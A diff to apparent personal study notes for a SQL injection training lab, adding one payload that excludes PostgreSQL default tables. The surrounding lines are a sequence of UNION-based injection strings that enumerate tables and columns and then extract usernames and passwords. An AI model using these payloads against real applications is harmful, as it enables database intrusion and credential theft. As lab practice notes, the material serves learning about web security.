@@ -152,6 +152,13 @@ Lab 5
 SQL injection attack, listing the database contents on non-Oracle databases
 		'+UNION+SELECT+'abc','def'+--+------
 		'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables+--+------
+		
+		That’s way too many tables. Let’s exclude all the pg tables, which is the PostgreSQL default tables.
+
+Excluding pg tables:
+		' UNION SELECT NULL,table_name FROM information_schema.tables WHERE table_name NOT LIKE '%pg%'-- -
+
+
 		'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'+--+------
 		'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef+--+------
 -----------------------------------------------------------------------
